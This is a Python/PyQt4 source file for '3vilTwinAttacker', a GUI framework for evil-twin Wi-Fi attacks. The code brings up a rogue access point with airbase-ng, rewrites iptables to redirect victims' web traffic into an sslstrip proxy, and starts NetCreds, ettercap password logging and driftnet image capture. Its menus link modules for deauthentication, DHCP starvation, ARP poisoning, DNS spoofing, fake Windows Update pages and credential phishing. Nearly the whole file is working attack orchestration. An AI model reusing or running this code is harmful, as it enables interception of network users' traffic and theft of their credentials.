#The MIT License (MIT)
#Copyright (c) 2015-2016 mh4x0f P0cL4bs Team
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
from PyQt4.QtGui import *
from PyQt4.QtCore import *
from shutil import move
from sys import argv
import logging
from re import search,compile,VERBOSE,IGNORECASE
from multiprocessing import Process
from time import asctime
from subprocess import Popen,PIPE,STDOUT,call,check_output
from Modules.ModuleStarvation import frm_dhcp_main
from Modules.ModuleDeauth import frm_window,frm_deauth
from Modules.ModuleMacchanger import frm_mac_generator
from Modules.ModuleProbeRequest import frm_PMonitor
from Modules.ModuleUpdateFake import frm_update_attack
from Modules.ModuleArpPosion import frm_Arp_Poison
from Modules.Credentials import frm_get_credentials,frm_NetCredsLogger
from Modules.ModuleDnsSpoof import frm_DnsSpoof
from Modules.utils import ProcessThread,Refactor,setup_logger,set_monitor_mode
from Core.Settings import frm_Settings
from Core.update import frm_Update
from Core.about import frmAbout
from twisted.web import http
from twisted.internet import reactor
from Plugins.sslstrip.StrippingProxy import StrippingProxy
from Plugins.sslstrip.URLMonitor import URLMonitor
from Plugins.sslstrip.CookieCleaner import CookieCleaner
from os import geteuid,system,path,getcwd,chdir,remove,popen,listdir
if search('/usr/share/',argv[0]):chdir('/usr/share/3vilTwinAttacker/')
author      = ' @mh4x0f P0cl4bs Team'
emails      = ['mh4root@gmail.com','p0cl4bs@gmail.com']
license     = 'MIT License (MIT)'
version     = '0.6.3'
date_create = '18/01/2015'
update      ='27/07/2015'
desc        = ['Framework for EvilTwin Attacks']

class Initialize(QMainWindow):
    def __init__(self, parent=None):
        super(Initialize, self).__init__(parent)
        self.form_widget    = SubMain(self)
        self.config         = frm_Settings()
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle('3vilTwin-Attacker v' + version)
        self.loadtheme(self.config.XmlThemeSelected())

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())

    def closeEvent(self, event):
        m = popen('iwconfig').readlines()
        self.interface  = self.config.xmlSettings('interface', 'monitor_mode',None,False)
        for i in m:
            if search('Mode:Monitor',i):
                reply = QMessageBox.question(self, 'About Exit','Are you sure to quit?', QMessageBox.Yes |
                    QMessageBox.No, QMessageBox.No)
                if reply == QMessageBox.Yes:
                    event.accept()
                    set_monitor_mode(self.interface).setDisable()
                else:
                    event.ignore()

class ThRunDhcp(QThread):
    def __init__(self,args):
        QThread.__init__(self)
        self.args = args
        self.process = None

    def run(self):
        print 'Starting Thread:' + self.objectName()
        self.process = p = Popen(self.args,
        stdout=PIPE,stderr=STDOUT)
        setup_logger('dhcp', './Logs/dhcp.log')
        loggerDhcp = logging.getLogger('dhcp')
        loggerDhcp.info('---[ Start DHCP '+asctime()+']---')
        for line,data in enumerate(iter(p.stdout.readline, b'')):
            print data.rstrip()
            if line > 4:
                self.emit(SIGNAL('Activated( QString )'),data.rstrip())
                loggerDhcp.info(data.rstrip())

    def stop(self):
        print 'Stop thread:' + self.objectName()
        if self.process is not None:
            self.process.terminate()
            self.process = None

class Threadsslstrip(QThread):
    def __init__(self,port):
        QThread.__init__(self)
        self.port = port

    def run(self):
        print 'Starting Thread:' + self.objectName()
        listenPort   = self.port
        spoofFavicon = False
        killSessions = True
        print 'SSLstrip v0.9 by Moxie Marlinspike Thread::online'
        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)
        strippingFactory              = http.HTTPFactory(timeout=10)
        strippingFactory.protocol     = StrippingProxy
        reactor.listenTCP(int(listenPort), strippingFactory)
        reactor.run(installSignalHandlers=False)
    def stop(self):
        print 'Stop thread:' + self.objectName()
        reactor.stop()


class SubMain(QWidget):
    def __init__(self, parent = None):
        super(SubMain, self).__init__(parent)
        #self.create_sys_tray()
        self.Main           = QVBoxLayout()
        self.config         = frm_Settings()
        self.module_arp     = frm_Arp_Poison()
        self.interface      = 'None'
        self.thread         = []
        self.MonitorImport  = frm_deauth()
        self.PortRedirect   = None
        self.Ap_iface       = None
        self.setGeometry(0, 0, 300, 400)
        self.intGUI()

    def intGUI(self):
        self.myQMenuBar = QMenuBar(self)
        self.myQMenuBar.setFixedWidth(400)
        self.StatusBar = QStatusBar()
        self.StatusBar.setFixedHeight(15)
        self.StatusBar.addWidget(QLabel("::Access|Point::"))
        self.StatusDhcp = QLabel("")
        self.Started(False)

        Menu_file = self.myQMenuBar.addMenu('&File')
        exportAction = QAction('exportToHtml', self)
        deleteAction = QAction('Clear Logger', self)
        exitAction = QAction('Exit', self)
        exitAction.setIcon(QIcon('rsc/close-pressed.png'))
        deleteAction.setIcon(QIcon('rsc/delete.png'))
        exportAction.setIcon(QIcon('rsc/export.png'))
        Menu_file.addAction(exportAction)
        Menu_file.addAction(deleteAction)
        Menu_file.addAction(exitAction)
        exitAction.triggered.connect(exit)
        deleteAction.triggered.connect(self.delete_logger)
        exportAction.triggered.connect(self.exportHTML)


        Menu_View = self.myQMenuBar.addMenu('&View')
        phishinglog = QAction('Credentials Phishing', self)
        netcredslog = QAction('Credentials NetCreds', self)
        #connect
        phishinglog.triggered.connect(self.credentials)
        netcredslog.triggered.connect(self.logsnetcreds)
        #icons
        phishinglog.setIcon(QIcon('rsc/password.png'))
        netcredslog.setIcon(QIcon('rsc/logger.png'))
        Menu_View.addAction(phishinglog)
        Menu_View.addAction(netcredslog)

        #tools Menu
        Menu_tools = self.myQMenuBar.addMenu('&Tools')
        ettercap = QAction('Active Ettercap', self)
        btn_drift = QAction('Active DriftNet', self)
        btn_drift.setShortcut('Ctrl+Y')
        ettercap.setShortcut('Ctrl+E')
        ettercap.triggered.connect(self.start_etter)
        btn_drift.triggered.connect(self.start_dift)

        # icons tools
        ettercap.setIcon(QIcon('rsc/ettercap.png'))
        btn_drift.setIcon(QIcon('rsc/capture.png'))
        Menu_tools.addAction(ettercap)
        Menu_tools.addAction(btn_drift)

        #menu module
        Menu_module = self.myQMenuBar.addMenu('&Modules')
        btn_deauth = QAction('Deauth Attack', self)
        btn_probe = QAction('Probe Request',self)
        btn_mac = QAction('Mac Changer', self)
        btn_dhcpStar = QAction('DHCP S. Attack',self)
        btn_winup = QAction('Windows Update',self)
        btn_arp = QAction('Arp Posion Attack',self)
        btn_dns = QAction('Dns Spoof Attack',self)
        action_settings = QAction('Settings',self)

        # Shortcut modules
        btn_deauth.setShortcut('Ctrl+W')
        btn_probe.setShortcut('Ctrl+K')
        btn_mac.setShortcut('Ctrl+M')
        btn_dhcpStar.setShortcut('Ctrl+H')
        btn_winup.setShortcut('Ctrl+N')
        btn_dns.setShortcut('ctrl+D')
        btn_arp.setShortcut('ctrl+Q')
        action_settings.setShortcut('Ctrl+X')

        #connect buttons
        btn_probe.triggered.connect(self.showProbe)
        btn_deauth.triggered.connect(self.formDauth)
        btn_mac.triggered.connect(self.form_mac)
        btn_dhcpStar.triggered.connect(self.show_dhcpDOS)
        btn_winup.triggered.connect(self.show_windows_update)
        btn_arp.triggered.connect(self.show_arp_posion)
        btn_dns.triggered.connect(self.show_dns_spoof)
        action_settings.triggered.connect(self.show_settings)

        #icons Modules
        btn_arp.setIcon(QIcon('rsc/arp_.png'))
        btn_winup.setIcon(QIcon('rsc/arp.png'))
        btn_dhcpStar.setIcon(QIcon('rsc/dhcp.png'))
        btn_mac.setIcon(QIcon('rsc/mac.png'))
        btn_probe.setIcon(QIcon('rsc/probe.png'))
        btn_deauth.setIcon(QIcon('rsc/deauth.png'))
        btn_dns.setIcon(QIcon('rsc/dns_spoof.png'))
        action_settings.setIcon(QIcon('rsc/setting.png'))

        # add modules menu
        Menu_module.addAction(btn_deauth)
        Menu_module.addAction(btn_probe)
        Menu_module.addAction(btn_mac)
        Menu_module.addAction(btn_dhcpStar)
        Menu_module.addAction(btn_winup)
        Menu_module.addAction(btn_arp)
        Menu_module.addAction(btn_dns)
        Menu_module.addAction(action_settings)

        #menu extra
        Menu_extra= self.myQMenuBar.addMenu('&Extra')
        Menu_about = QAction('About',self)
        Menu_help = QAction('Help',self)
        Menu_update = QAction('Update',self)
        #icons extra
        Menu_about.setIcon(QIcon('rsc/about.png'))
        Menu_help.setIcon(QIcon('rsc/report.png'))
        Menu_update.setIcon(QIcon('rsc/update.png'))
        Menu_about.triggered.connect(self.about)
        Menu_update.triggered.connect(self.show_update)
        Menu_extra.addAction(Menu_update)
        Menu_extra.addAction(Menu_about)

        self.EditGateway = QLineEdit(self)
        self.EditApName = QLineEdit(self)
        self.EditChannel = QLineEdit(self)
        self.selectCard = QComboBox(self)
        self.ListLoggerDhcp = QListWidget(self)
        self.ListLoggerDhcp.setFixedHeight(170)
        try:
            self.EditGateway.setText([Refactor.get_interfaces()[x] for x in Refactor.get_interfaces().keys() if x == 'gateway'][0])
        except:pass
        self.EditApName.setText(self.config.xmlSettings('AP', 'name',None,False))
        self.EditChannel.setText(self.config.xmlSettings('channel', 'mchannel',None,False))
        self.PortRedirect = self.config.xmlSettings('redirect', 'port',None,False)

        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if search('wlan', j):
                self.selectCard.addItem(n[i])

        if not path.isfile('Modules/Templates/Windows_Update/Settins_WinUpdate.html'):
            system('cp Settings/source.tar.gz Modules/Templates/')
            system('cd Modules/Templates/ && tar -xf source.tar.gz')
            remove('Modules/Templates/source.tar.gz')

        driftnet = popen('which driftnet').read().split('\n')
        ettercap = popen('which ettercap').read().split('\n')
        lista = [ '/usr/sbin/airbase-ng', ettercap[0],driftnet[0]]
        self.m = []
        for i in lista:
            self.m.append(path.isfile(i))

        self.form = QFormLayout()
        self.form2 = QFormLayout()
        hLine = QFrame()
        hLine.setFrameStyle(QFrame.HLine)
        hLine.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        hLine2 = QFrame()
        hLine2.setFrameStyle(QFrame.HLine)
        hLine2.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        vbox = QVBoxLayout()
        vbox.setMargin(5)
        vbox.addStretch(20)
        self.form.addRow(vbox)
        self.logo = QPixmap(getcwd() + '/rsc/logo.png')
        self.imagem = QLabel(self)
        self.imagem.setPixmap(self.logo)
        self.form.addRow(self.imagem)

        self.form.addRow('Gateway:', self.EditGateway)
        self.form.addRow('AP Name:', self.EditApName)
        self.form.addRow('Channel:', self.EditChannel)

        # grid network adapter fix
        self.btrn_refresh = QPushButton('Refresh')
        self.btrn_refresh.setIcon(QIcon('rsc/refresh.png'))
        self.btrn_refresh.clicked.connect(self.refrash_interface)
        self.grid = QGridLayout()
        self.grid.addWidget(QLabel('Network Adapter:'),0,0)
        self.grid.addWidget(self.selectCard, 0,1)
        self.grid.addWidget(self.btrn_refresh,0,2)

        self.btn_start_attack = QPushButton('Start Attack', self)
        self.btn_start_attack.setIcon(QIcon('rsc/start.png'))
        self.btn_start_attack.setFixedWidth(160)
        self.btn_cancelar = QPushButton('Stop Attack', self)
        self.btn_cancelar.setIcon(QIcon('rsc/Stop.png'))
        self.btn_cancelar.setFixedWidth(165)
        self.btn_cancelar.clicked.connect(self.kill)
        self.btn_start_attack.clicked.connect(self.StartApFake)

        self.form2.addRow(self.btn_start_attack, self.btn_cancelar)
        self.form2.addRow(self.ListLoggerDhcp)
        self.form2.addRow(self.StatusBar)
        self.Main.addLayout(self.form)
        self.Main.addLayout(self.grid)
        self.Main.addLayout(self.form2)
        self.setLayout(self.Main)

    def show_update(self):
        self.Fupdate = frm_Update()
        self.Fupdate.show()
    def show_arp_posion(self):
        self.Farp_posion = frm_Arp_Poison()
        self.Farp_posion.setGeometry(0, 0, 450, 300)
        self.Farp_posion.show()
    def show_settings(self):
        self.FSettings = frm_Settings()
        self.FSettings.show()
    def show_windows_update(self):
        self.FWinUpdate = frm_update_attack()
        self.FWinUpdate.setGeometry(QRect(100, 100, 450, 300))
        self.FWinUpdate.show()
    def show_dhcpDOS(self):
        self.Fstar = frm_dhcp_main()
        self.Fstar.setGeometry(QRect(100, 100, 450, 200))
        self.Fstar.show()
    def showProbe(self):
        self.Fprobe = frm_PMonitor()
        self.Fprobe.setGeometry(QRect(100, 100, 400, 200))
        self.Fprobe.show()
    def formDauth(self):
        self.Fdeauth = frm_window()
        self.Fdeauth.setGeometry(QRect(100, 100, 200, 200))
        self.Fdeauth.show()
    def form_mac(self):
        self.Fmac = frm_mac_generator()
        self.Fmac.setGeometry(QRect(100, 100, 300, 100))
        self.Fmac.show()
    def show_dns_spoof(self):
        self.Fdns = frm_DnsSpoof()
        self.Fdns.setGeometry(QRect(100, 100, 450, 300))
        self.Fdns.show()

    def credentials(self):
        self.Fcredentials = frm_get_credentials()
        self.Fcredentials.setWindowTitle('Get credentials Phishing')
        self.Fcredentials.show()
    def logsnetcreds(self):
        self.FnetCreds = frm_NetCredsLogger()
        self.FnetCreds.setWindowTitle('NetCreds Logger')
        self.FnetCreds.show()

    def Started(self,bool):
        if bool:
            self.StatusDhcp.setText("[ON]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : green; }")
        else:
            self.StatusDhcp.setText("[OFF]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : red; }")
        self.StatusBar.addWidget(self.StatusDhcp)

    def dhcpLog(self,log):
        self.ListLoggerDhcp.addItem(log)
        self.ListLoggerDhcp.scrollToBottom()

    def exportHTML(self):
        contents = Refactor.exportHtml()
        filename = QFileDialog.getSaveFileNameAndFilter(self,
        "Save File Logger HTML","report.html","HTML (*.html)")
        if len(filename) != 0:
            with open(str(filename[0]),'w') as filehtml:
                filehtml.write(contents),filehtml.close()

    def refrash_interface(self):
        self.selectCard.clear()
        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if search('wlan', j):
                self.selectCard.addItem(n[i])

    def kill(self):
        for i in self.thread:
            try:
                i.stop()
            except:
                pass
        try:
            terminate = \
            [
                'killall dhcpd',
                'killall dnsmasq'
                'killall xterm',
                'airmon-ng stop '+self.interface,
                'echo \'0\' > /proc/sys/net/ipv4/ip_forward',
                'iptables --flush',
                'iptables --table nat --flush',
                'iptables --delete-chain',
                'iptables --table nat --delete-chain',
                'ifconfig at0 down',
            ]
            for delete in terminate:
                system(delete)
        except:
            pass
        set_monitor_mode(self.interface).setDisable()
        self.Started(False)
        self.ListLoggerDhcp.clear()

    def delete_logger(self):
        if listdir('Logs')!= '':
            resp = QMessageBox.question(self, 'About Delete Logger',
                'do you want to delete Logs?',QMessageBox.Yes |
                    QMessageBox.No, QMessageBox.No)
            if resp == QMessageBox.Yes:
                system('rm Logs/*.cap')
                system('rm Logs/*.log')

    def start_etter(self):
        if self.m[1]:
            if search('at0',str(popen('ifconfig').read())):
                call(['sudo', 'xterm', '-geometry', '73x25-1+50',
                '-T', 'ettercap', '-s', '-sb', '-si', '+sk', '-sl',
                    '5000', '-e', 'ettercap', '-p', '-u', '-T', '-q', '-w',
                      'Logs/passwords', '-i', 'at0'])
        else:
            QMessageBox.information(self,'ettercap','ettercap not found.')
    def start_dift(self):
        if self.m[2]:
            if search('at0',str(popen('ifconfig').read())):
                call(['sudo', 'xterm', '-geometry', '75x15+1+200',
                    '-T', 'DriftNet', '-e', 'driftnet', '-i', 'at0'])
        else:
            QMessageBox.information(self,'driftnet','driftnet not found.')

    def CoreSettings(self):
        range_dhcp = self.config.xmlSettings('Iprange', 'range',None,False)
        self.PortRedirect = self.config.xmlSettings('redirect', 'port',None,False)
        self.SettingsAP = {
        'interface':
            [
                'ifconfig %s up'%(self.Ap_iface),
                'ifconfig %s 10.0.0.1 netmask 255.255.255.0'%(self.Ap_iface),
                'ifconfig %s mtu 1400'%(self.Ap_iface),
                'route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1'
            ],
        'iptables':
            [
                'killall dhpcd',
                'killall dnsmasq',
                'iptables --flush',
                'iptables --table nat --flush',
                'iptables --delete-chain',
                'iptables --table nat --delete-chain',
                'echo 1 > /proc/sys/net/ipv4/ip_forward',
                'iptables -P FORWARD ACCEPT',
                'iptables -t nat -A PREROUTING -p udp -j DNAT --to %s'%(self.EditGateway.text()),
                'iptables --append FORWARD --in-interface %s -j ACCEPT'%(self.Ap_iface),
                'iptables --table nat --append POSTROUTING --out-interface '+str(Refactor.get_interfaces()['activated'])+' -j MASQUERADE',
                'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port '+self.PortRedirect,
                #'iptables -t -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ' +Refactor.get_interfaces()['IPaddress'],
                'iptables -t nat -A POSTROUTING -j MASQUERADE',
                'touch /var/run/dhcpd.pid',
                'chmod 777 /etc/dhcp/dhcpd.conf',
            ],
        'dhcp-server':
            [
                'authoritative;\n',
                'default-lease-time 600;\n',
                'max-lease-time 7200;\n',
                'subnet 10.0.0.0 netmask 255.255.255.0 {\n',
                'option routers 10.0.0.1;\n',
                'option subnet-mask 255.255.255.0;\n',
                'option domain-name \"%s\";\n'%(str(self.EditApName.text())),
                'range %s;\n'% range_dhcp,
                '}',
            ],
        'dnsmasq':
            [
                'interface=%s\n'%(self.Ap_iface),
                'dhcp-range=10.0.0.10,10.0.0.50,12h\n',
                'server=8.8.8.8\n',
                'server=8.8.4.4\n',
            ]
        }
        for i in self.SettingsAP['interface']:popen(i)
        for i in self.SettingsAP['iptables']:popen(i)
        dhcp_select = self.config.xmlSettings('dhcp','dhcp_server',None,False)
        if dhcp_select != 'dnsmasq':
            with open('Settings/dhcpd.conf','w') as dhcp:
                for i in self.SettingsAP['dhcp-server']:
                    dhcp.write(i)
                dhcp.close()
                if path.isfile('/etc/dhcp/dhcpd.conf'):
                    system('rm /etc/dhcp/dhcpd.conf')
                move('Settings/dhcpd.conf', '/etc/dhcp/')
        else:
            with open('Settings/dnsmasq.conf','w') as dhcp:
                for i in self.SettingsAP['dnsmasq']:
                    dhcp.write(i)
                dhcp.close()

    def StartApFake(self):
        self.ListLoggerDhcp.clear()
        if geteuid() != 0:
            QMessageBox.information(self,'Error permission',
            'Run as root ')
            return
        if len(self.selectCard.currentText()) == 0:
            QMessageBox.information(self,'Error',
            'Network interface not supported :(')
            return

        self.interface = str(set_monitor_mode(self.selectCard.currentText()).setEnable())
        self.config.xmlSettings('interface', 'monitor_mode',self.interface,False)
        # airbase thread
        thr_airbase = ProcessThread(['airbase-ng',
        '-c', str(self.EditChannel.text()), '-e', self.EditApName.text(),
        '-F', 'Logs/'+asctime(),self.interface])
        thr_airbase.name = 'Airbase-ng'
        self.thread.append(thr_airbase)
        thr_airbase.start()

        # settings conf
        while True:
            if thr_airbase.iface != None:
                self.Ap_iface = [x for x in Refactor.get_interfaces()['all'] if search('at',x)][0]
                self.config.xmlSettings('netcreds', 'interface',self.Ap_iface,False)
                break
        # thread netcreds
        ThNetCreds = ProcessThread(['python','Plugins/NetCreds.py','-i',
        self.config.xmlSettings('netcreds', 'interface',None,False)])
        ThNetCreds.setName('Net-Creds')
        self.thread.append(ThNetCreds)
        ThNetCreds.start()
        p = Process(target=self.CoreSettings,args=())
        p.start(),p.join()

        # thread dhcp
        if self.config.xmlSettings('dhcp','dhcp_server',None,False) != 'dnsmasq':
            Thdhcp = ThRunDhcp(['sudo','dhcpd','-d','-f','-cf','/etc/dhcp/dhcpd.conf',self.Ap_iface])
            self.connect(Thdhcp,SIGNAL('Activated ( QString ) '), self.dhcpLog)
            Thdhcp.setObjectName('DHCP')
            self.thread.append(Thdhcp)
            Thdhcp.start()
            self.Started(True)
        else:
            Thdhcp = ThRunDhcp(['dnsmasq','-C','Settings/dnsmasq.conf','-d'])
            self.connect(Thdhcp,SIGNAL('Activated ( QString ) '), self.dhcpLog)
            Thdhcp.setObjectName('DHCP')
            self.thread.append(Thdhcp)
            Thdhcp.start()
            self.Started(True)


        # thread sslstrip
        Thsslstrip = Threadsslstrip(self.PortRedirect)
        Thsslstrip.setObjectName("Sslstrip")
        self.thread.append(Thsslstrip)
        Thsslstrip.start()

    def create_sys_tray(self):
        self.sysTray = QSystemTrayIcon(self)
        self.sysTray.setIcon(QIcon('rsc/icon.ico'))
        self.sysTray.setVisible(True)
        self.connect(self.sysTray,
        SIGNAL('activated(QSystemTrayIcon::ActivationReason)'),
            self.on_sys_tray_activated)
        self.sysTrayMenu = QMenu(self)
        act = self.sysTrayMenu.addAction('FOO')

    def on_sys_tray_activated(self, reason):
        if reason == 3:self.showNormal()
        elif reason == 2:self.showMinimized()

    def about(self):
        self.Fabout = frmAbout()
        self.Fabout.show()
